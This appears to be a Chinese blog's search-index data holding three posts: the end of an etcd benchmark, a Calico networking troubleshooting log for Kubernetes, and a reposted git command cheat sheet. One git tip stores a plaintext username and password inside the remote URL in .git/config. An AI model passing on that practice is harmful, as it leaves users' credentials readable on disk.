histogram: 0.0123 [1] | 0.0194 [1105] |∎ 0.0266 [23001] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0337 [30319] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0408 [13738] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0480 [17523] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0551 [9420] |∎∎∎∎∎∎∎∎∎∎∎∎ 0.0622 [3625] |∎∎∎∎ 0.0693 [506] | 0.0765 [597] | 0.0836 [165] | Latency distribution: 10% in 0.0235 secs. 25% in 0.0268 secs. 50% in 0.0319 secs. 75% in 0.0437 secs. 90% in 0.0501 secs. 95% in 0.0548 secs. 99% in 0.0649 secs. 99.9% in 0.0791 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 6.2 0.2 10687728 89612 pts/10 Sl+ 13:46 1:41 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:11:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"K8S calico网络插件问题集，持续更新","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"K8S calico网络插件问题集，持续更新 ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:0:0","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"calico node pod一直没有起来 Number of node(s) with BGP peering established = 0 网上解决方法如下： https://blog.csdn.net/qq_36783142/article/details/107912407 name: IP_AUTODETECTION_METHOD value: “interface=enp26s0f3” 但此方式不能解决自己环境所遇问题。 分析应该是网络路由问题（原来环境残留的脏路由导致），做下清理处理 执行下面命令解决 systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:1:0","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"calico node pod异常 Readiness probe failed: container is not running 现象如下 [root@node2 ~]# kubectl get po -A -owide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES kube-system calico-kube-controllers-67f55f8858-5cgpg 1/1 Running 2 14d 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system calico-node-l6crs 0/1 Running 3 18d 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system calico-node-vb7s5 0/1 Running 1 57m 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e calico node 异常现象跟上面类似，但是探针检查失败 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning Unhealthy 69m (x2936 over 12d) kubelet Readiness probe errored: rpc error: code = Unknown desc = operation timeout: context deadline exceeded Warning Unhealthy 57m (x2938 over 12d) kubelet Liveness probe errored: rpc error: code = Unknown desc = operation timeout: context deadline exceeded Warning Unhealthy 12m (x6 over 13m) kubelet Liveness probe failed: container is not running Normal SandboxChanged 11m (x2 over 13m) kubelet Pod sandbox changed, it will be killed and re-created. Normal Killing 11m (x2 over 13m) kubelet Stopping container calico-node Warning Unhealthy 8m3s (x32 over 13m) kubelet Readiness probe failed: container is not running Warning Unhealthy 4m45s (x6 over 5m35s) kubelet Liveness probe failed: container is not running Normal SandboxChanged 3m42s (x2 over 5m42s) kubelet Pod sandbox changed, it will be killed and re-created. Normal Killing 3m42s (x2 over 5m42s) kubelet Stopping container calico-node Warning Unhealthy 42s (x31 over 5m42s) kubelet Readiness probe failed: container is not running 查看异常pod日志信息，发现进程端口被占用。通过netstat命令查看端口占用进程，发现下面进程一直残留 删除calico-node组件，包括kill，上面进程仍然残留 # 删除calico-node组件 cd /etc/kubernetes/ kubectl delete -f calico-node.yml 这些进程为docker启动，但未回收，此时21881进程状态为D - 不可中断的睡眠状态。 通过重启服务器节点，解除calico服务端口占用。问题解决。 有时进程可以进行删除，如下残留进程/usr/local/bin/runsvdir -P /etc/service/enabled，状态为S，其子进程包含了calico相关服务，通过kill命令清理，然后再启动calico-node组件 [root@node2 kubernetes]# ps -ef |grep 175885 root 24910 36399 0 16:04 pts/6 00:00:00 grep --color=auto 175885 root 175885 175862 0 15:12 ? 00:00:00 /usr/local/bin/runsvdir -P /etc/service/enabled root 201783 175885 0 15:29 ? 00:00:00 runsv felix root 201784 175885 0 15:29 ? 00:00:00 runsv monitor-addresses root 201785 175885 0 15:29 ? 00:00:00 runsv allocate-tunnel-addrs root 201786 175885 0 15:29 ? 00:00:00 runsv bird root 201787 175885 0 15:29 ? 00:00:00 runsv bird6 root 201788 175885 0 15:29 ? 00:00:00 runsv confd [root@node2 kubernetes]# ps aux |grep 175885 root 25633 0.0 0.0 112712 960 pts/6 S+ 16:05 0:00 grep --color=auto 175885 root 175885 0.0 0.0 4356 372 ? Ss 15:12 0:00 /usr/local/bin/runsvdir -P /etc/service/enabled [root@node2 kubernetes]# [root@node2 kubernetes]# [root@node2 kubernetes]# kill 175885 [root@node2 kubernetes]# [root@node2 kubernetes]# [root@node2 kubernetes]# ps -ef |grep calico root 33242 36399 0 16:11 pts/6 00:00:00 grep --color=auto calico [root@node2 kubernetes]# [root@node2 kubernetes]# 所以删除calico-node组件时，需要通过ps -ef |grep calico确认节点上是否还有calico相关进程 [root@node2 net.d]# [root@node2 net.d]# ps -ef |grep calico root 57982 18990 0 10:54 pts/8 00:00:00 grep --color=auto calico root 219142 219137 0 2020 ? 00:01:11 calico-node -allocate-tunnel-addrs root 219143 219135 0 2020 ? 02:25:07 calico-node -felix root 219144 219136 0 2020 ? 00:01:51 calico-node -monitor-addresses root 219145 219140 0 2020 ? 00:01:13 calico-node -confd root 219407 219138 0 2020 ? 00:11:20 bird -R -s /var/run/calico/bird.ctl -d -c /etc/calico/confd/config/bird.cfg root 219408 219139 0 2020 ? 00:10:59 bird6 -R -s /var/run/calico/bird6.ctl -d -c /etc/calico/confd/config/bird6.cfg ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:2:0","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"附录 ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:3:0","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"检查当前节点的calico网络状态 calicoctl node status calico网络成功配置示例： [root@node2 kubernetes]# calicoctl node status Calico process is running. IPv4 BGP status +--------------+-------------------+-------+----------+-------------+ | PEER ADDRESS | PEER TYPE | STATE | SINCE | INFO | +--------------+-------------------+-------+----------+-------------+ | 192.168.1.11 | node-to-node mesh | up | 08:13:23 | Established | +--------------+-------------------+-------+----------+-------------+ IPv6 BGP status No IPv6 peers found. ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:3:1","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"获取k8s node命令 # run in master node DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get nodes 示例 [root@node2 kubernetes]# DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get nodes NAME gpu53 node2 ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:3:2","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["K8S"],"content":"获取ipPool命令 # run in master node DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get ipPool -o yaml 示例 [root@node2 kubernetes]# DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get ipPool -o yaml apiVersion: projectcalico.org/v3 items: [] kind: IPPoolList metadata: {} ","date":"2021-01-13","objectID":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/:3:3","tags":["K8S"],"title":"K8S calico网络插件问题集","uri":"/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/"},{"categories":["开发"],"content":"记录一些 git 常用和一些记不住的命令","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"[转载]这里是我的笔记，记录一些 git 常用和一些记不住的命令，这个笔记原本是基于 颜海镜的文章增加的，后面慢慢增加了许多内容，独立一个仓库维护，方便查询和使用。 目录 安装卸载 配置管理 不常见的使用场景 忽略文件的权限变化 设置大小写敏感 配置自动换行 创建SSH密钥 多账号ssh配置 免密码登录远程服务器 https协议下提交代码免密码 文件推向3个git库 修改远程仓库地址 撤销远程记录 放弃本地的文件修改 最简单放弃本地修改内容 回退到某一个版本 搜索 commit 历史记录 回滚到某个commit提交 去掉某个commit 把 A 分支的某一个 commit，放到 B 分支上 获取最近一次提交的 commit id 两个 git 仓库合并 合并多个commit 修改远程Commit记录 利用commit关闭一个issue 新建一个空分支 添加忽略文件 忽略某个文件的改动 同步fork的上游仓库 手动合并冲突的 Pull Request 修改作者名 批量修改历史commit中的名字和邮箱 查看两个星期内的改动 查看某个文件历史 查看git仓库中最近修改的分支 更新所有本地分支 打造自己的git命令 删除已经合并到 master 的分支 中文乱码的解决方案 提交一个空文件夹 新建仓库 init status add commit remote push clone 本地 help add rm commit reset revert checkout diff stash merge cherry-pick rebase 分支branch 删除 提交 拉取 分支合并 重命名 查看 新建 连接 分支切换 远端 submodule 更新 submodule 删除 submodule 转换分支 删除文件 remote 标签tag 重命名Tag 日志log 重写历史 其它 报错问题解决 参考资料 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"安装卸载 官方教程，在 Linux/Unix 系统中，通过工具在中安装 git,这种方式比较简单，便于升级卸载工具。 下面介绍在 CentOS 系统中，通过 yum 来安装 git Red Hat Enterprise Linux, Oracle Linux, CentOS, Scientific Linux, et al. RHEL and derivatives typically ship older versions of git. You can download a tarball and build from source, or use a 3rd-party repository such as the IUS Community Project to obtain a more recent version of git. 官方文档说 git 在 RHEL 和衍生产品通常都会发布旧版本的 git，我们需要源码编译安装，或者使用第三方存储库（如IUS社区项目）。 现在我们通过，IUS社区下载 ius-release.rpm 文件进行安装 # 注意下载不同的版本，本机 CentOS 7 wget https://centos7.iuscommunity.org/ius-release.rpm # 安装rpm文件 rpm -ivh ius-release.rpm 查看可安装的git安装包 repoquery --whatprovides git # git-0:1.8.3.1-13.el7.x86_64 # git2u-0:2.16.5-1.ius.centos7.x86_64 # git2u-0:2.16.2-1.ius.centos7.x86_64 # git2u-0:2.16.4-1.ius.centos7.x86_64 # git-0:1.8.3.1-14.el7_5.x86_64 yum 卸载 git 安装新版本 卸载 1.8.3 的 git，安装 2.16.5 的 git # 卸载老的版本 yum remove git # 安装新的版本 yum install git2u ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:1:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"配置管理 首先是配置帐号信息 ssh -T git@github.com 测试。 git help config # 获取帮助信息，查看修改个人信息的参数 git config --list # 查看配置的信息 git config --global user.name \"小弟调调\" # 修改全局名字 git config --global user.email \"wowohoo@qq.com\" # 修改全局邮箱 git config --global --unset \u003centry-name\u003e # 删除全局设置 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:2:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"不常见的使用场景 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"忽略文件的权限变化 不再将文件的权限变化视作改动 git config core.fileMode false ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"设置大小写敏感 git config --get core.ignorecase # 查看git 的设置 git config core.ignorecase false # 设置大小写敏感 git rm -r --cached \u003c目录/文件\u003e # 远程有俩相同目录，通过这种方式清除掉，然后提交记录 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:2","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"配置自动换行 自动转换坑太大，提交到git是自动将换行符转换为lf git config --global core.autocrlf input ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:3","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"创建SSH密钥 这个密钥用来跟 github 通信，在本地终端里生成然后上传到 github ssh-keygen -t rsa -C 'wowohoo@qq.com' # 生成密钥 ssh-keygen -t rsa -C \"wowohoo@qq.com\" -f ~/.ssh/ww_rsa # 指定生成目录文件名字 ssh -T git@github.com # 测试是否成功 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:4","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"多账号ssh配置 1.生成指定名字的密钥 ssh-keygen -t rsa -C \"邮箱地址\" -f ~/.ssh/jslite_rsa 会生成 jslite_rsa 和 jslite_rsa.pub 这两个文件 2.密钥复制到托管平台上 vim ~/.ssh/jslite_rsa.pub 打开公钥文件 jslite_rsa.pub ，并把内容复制至代码托管平台上 3.修改config文件 vim ~/.ssh/config #修改config文件，如果没有创建 config Host jslite.github.com HostName github.com User git IdentityFile ~/.ssh/jslite_rsa Host work.github.com HostName github.com # Port 服务器open-ssh端口（默认：22,默认时一般不写此行） # PreferredAuthentications 配置登录时用什么权限认证 # publickey|password publickey|keyboard-interactive等 User git IdentityFile ~/.ssh/work_rsa Host 这里是个别名可以随便命名 HostName 一般是网站如：git@ss.github.com:username/repo.git 填写 github.com User 通常填写git IdentityFile 使用的公钥文件地址 4.测试 ssh -T git@jslite.github.com # `@`后面跟上定义的Host ssh -T work.github.com # 通过别名测试 ssh -i ~/公钥文件地址 Host别名 # 如 ssh -i ~/.ssh/work_rsa work.github.com 5.使用 # 原来的写法 git clone git@github.com:\u003cjslite的用户名\u003e/learngit.git # 现在的写法 git clone git@jslite.github.com:\u003cjslite的用户名\u003e/learngit.git git clone git@work.github.com:\u003cwork的用户名\u003e/learngit.git 5.注意 如果你修改了id_rsa的名字，你需要将ssh key添加到SSH agent中，如： ssh-add ~/.ssh/jslite_rsa ssh-add -l # 查看所有的key ssh-add -D # 删除所有的key ssh-add -d ~/.ssh/jslite_rsa # 删除指定的key ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:5","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"免密码登录远程服务器 $ ssh-keygen -t rsa -P '' -f ~/.ssh/aliyunserver.key $ ssh-copy-id -i ~/.ssh/aliyunserver.key.pub root@192.168.182.112 # 这里需要输入密码一次 编辑 ~/.ssh/config Host aliyun1 HostName 192.168.182.112 User root PreferredAuthentications publickey IdentityFile ~/.ssh/aliyunserver.key 上面配置完了，可以通过命令登录，不需要输入IP地址和密码 ssh aliyun1 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:6","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"https协议下提交代码免密码 git clone https://github.com/username/rep.git 通过上面方式克隆可能需要密码，解决办法：进入当前克隆的项目 vi rep/.git/config 编辑 config, 按照下面方式修改，你就可以提交代码不用输入密码了。 [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true ignorecase = true precomposeunicode = true [remote \"origin\"] - url = https://github.com/username/rep.git + url = https://用户名:密码@github.com/username/rep.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:7","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"文件推向3个git库 1. 增加3个远程库地址 git remote add origin https://github.com/JSLite/JSLite.git git remote set-url --add origin https://gitlab.com/wang/JSLite.js.git git remote set-url --add origin https://oschina.net/wang/JSLite.js.git 2. 删除其中一个 set-url 地址 usage: git remote set-url [--push] \u003cname\u003e \u003cnewurl\u003e [\u003coldurl\u003e] or: git remote set-url --add \u003cname\u003e \u003cnewurl\u003e or: git remote set-url --delete \u003cname\u003e \u003curl\u003e git remote set-url --delete origin https://oschina.net/wang/JSLite.js.git 3.推送代码 git push origin master git push -f origin master # 强制推送 4.拉代码 只能拉取 origin 里的一个url地址，这个fetch-url 默认为你添加的到 origin的第一个地址 git pull origin master git pull --all # 获取远程所有内容包括tag git pull origin next:master # 取回origin主机的next分支，与本地的master分支合并 git pull origin next # 远程分支是与当前分支合并 # 上面一条命令等同于下面两条命令 git fetch origin git merge origin/next 如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。 但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。 $ git pull -p # 等同于下面的命令 $ git fetch --prune origin $ git fetch -p 5.更改pull 只需要更改config文件里，那三个url的顺序即可，fetch-url会直接对应排行第一的那个utl连接。 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:8","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"修改远程仓库地址 git remote remove origin # 删除该远程路径 git remote add origin git@jslite.github.com:JSLite/JSLite.git # 添加远程路径 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:9","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"撤销远程记录 git reset --hard HEAD~1 # 撤销一条记录 git push -f origin HEAD:master # 同步到远程仓库 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:10","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"放弃本地的文件修改 git reset --hard FETCH_HEAD # FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull git reset --hard FETCH_HEAD 出现错误 git pull You are not currently on a branch, so I cannot use any 'branch.\u003cbranchname\u003e.merge' in your configuration file. Please specify which remote branch you want to use on the command line and try again (e.g. 'git pull \u003crepository\u003e \u003crefspec\u003e'). See git-pull(1) FOR details. 解决方法： git checkout -b temp # 新建+切换到temp分支 git checkout master ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:11","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"最简单放弃本地修改内容 # 如果有的修改以及加入暂存区的话 git reset --hard # 还原所有修改，不会删除新增的文件 git checkout . # 下面命令会删除新增的文件 git clean -xdf 通过存储暂存区stash，在删除暂存区的方法放弃本地修改。 git stash \u0026\u0026 git stash drop ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:12","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"回退到某一个版本 git reset --hard \u003chash\u003e # 例如 git reset --hard a3hd73r # --hard代表丢弃工作区的修改，让工作区与版本代码一模一样，与之对应， # --soft参数代表保留工作区的修改。 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:13","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"搜索 commit 历史记录 git log --grep=224 # 这条命令是查看含有 \"224\" 关键字的 git commit ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:14","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"回滚到某个commit提交 git revert HEAD~1 # 撤销一条记录 会弹出 commit 编辑 git push # 提交回滚 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:15","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"去掉某个commit # 实质是新建了一个与原来完全相反的commit，抵消了原来commit的效果 git revert \u003ccommit-hash\u003e ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:3:16","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"把 A 分支的某一个 commit，放到 B 分支上 对两个分支，同时都拥有的文件，进行修改后，再同时 commit 到这两个分支，比如 master 分支和 branch1 分支，都拥有文件 test.js ，在 master 或者 branch1 分支下对 test.js 进行修改后，把修改的 test.js 